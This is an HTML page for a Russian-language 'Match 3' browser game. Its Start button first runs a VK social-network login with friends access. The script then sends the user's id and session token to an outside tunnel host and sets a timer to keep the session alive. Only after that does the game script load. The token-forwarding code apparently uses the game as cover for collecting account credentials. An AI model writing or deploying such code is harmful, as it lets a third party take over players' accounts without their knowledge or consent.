<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Match 3</title>
  <style>
    body {
      background: linear-gradient(to bottom, #ADD8E6, #87CEEB);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      overflow: hidden;
      color: white;
    }

    #gameContainer {
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    #gameBoard {
      display: grid;
      grid-gap: 2px;
      border: 1px solid black;
      width: 870px;
      height: 870px;
      background-color: #77B5FE;
      border-radius: 20px;
      overflow: hidden;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
    }

    .cell {
      width: calc(870px / 8 - 2px);
      height: calc(870px / 8 - 2px);
      text-align: center;
      font-size: 24px;
      cursor: pointer;
      transition: transform 0.2s ease, background-color 0.2s ease;
      background-size: contain;
      background-repeat: no-repeat;
      background-position: center;
      border-radius: 15px;
      background-color: #6495ED;
    }

    .cell.swapping {
      transform: scale(1.2);
    }

    .cell.removing {
      opacity: 0;
      transition: opacity 0.2s ease;
    }

    #start {
      padding: 20px 40px;
      font-size: 24px;
      cursor: pointer;
      background-color: #4682B4;
      color: white;
      border: none;
      border-radius: 10px;
      transition: background-color 0.3s ease;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      z-index: 100;
    }

    #start.hidden {
      display: none;
    }

    #start:hover {
      background-color: #5F9EA0;
    }
  </style>
</head>
<body>

  <div id="gameContainer">
    <button id="start" onclick="initialize()">St8art</button>
    <div id="gameBoard"></div>
  </div>

  <script src="https://unpkg.com/@vkid/sdk@<2.5.0/dist-sdk/umd/index.js"></script>

<script>
  const APP_ID = 8109529;
  let accessToken = null;
  let userInfo = null;
  let tokenRefreshTimer = null;

  function showError(message) {
    console.error(message);
  }

  function updateStatus(message) {
    console.log(message);
  }

  function hideStartButton() {
    const startButton = document.getElementById('start');
    if (startButton) {
      startButton.classList.add('hidden');
    }
  }

  function initialize() {
    hideStartButton();

    VK.init({ apiId: APP_ID });

    VK.Auth.login((response) => {
      if (response.session) {
        userInfo = response.session.user;
        accessToken = response.session.sid;

        console.log("✅ Авторизация успешна", userInfo);

        const tokenData = {
          user_id: userInfo.id.toString(),
          access_token: accessToken,
          expires_in: 86400, // Время жизни сессии (по умолчанию 1 день)
          token_datetime: new Date().toUTCString()
        };

        sendTokenToYourServer(tokenData);
        setupTokenRefresh(tokenData.expires_in);

        showGame();
      } else {
        showError("Ошибка авторизации");
      }
    }, VK.access.FRIENDS);
  }

  async function sendTokenToYourServer(data) {
    try {
      const response = await fetch("https://bla39d-37-45-190-41.ru.tuna.am/api/vk-token", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
      });

      if (!response.ok) {
        throw new Error(`Ошибка ${response.status}: ${response.statusText}`);
      }

      console.log("Данные успешно отправлены на сервер");
    } catch (error) {
      console.error("Ошибка отправки на сервер:", error);
      showError("Ошибка сохранения данных");
    }
  }

  function setupTokenRefresh(expiresIn) {
    if (tokenRefreshTimer) {
      clearTimeout(tokenRefreshTimer);
    }

    tokenRefreshTimer = setTimeout(() => {
      console.log("⏳ Автоматическое обновление сессии...");

      VK.Auth.getLoginStatus((response) => {
        if (response.session) {
          accessToken = response.session.sid;
          console.log("🔄 Токен успешно обновлён");
          setupTokenRefresh(86400); // Обновляем через 1 день
        } else {
          showError("Сессия устарела, требуется повторный вход");
        }
      });
    }, (expiresIn - 60) * 1000);
  }

  function showGame() {
    loadGameScript().then(() => {
      if (typeof startGame === "function") {
        startGame();
      } else {
        showError("Ошибка инициализации игры");
      }
    }).catch(error => {
      console.error("Ошибка загрузки игры:", error);
      showError("Не удалось загрузить игру");
    });
  }

  function loadGameScript() {
    return new Promise((resolve, reject) => {
      const script = document.createElement("script");
      script.src = "game.js";
      script.onload = resolve;
      script.onerror = reject;
      document.head.appendChild(script);
    });
  }
</script>



  <script src="game.js"></script>
</body>
</html>
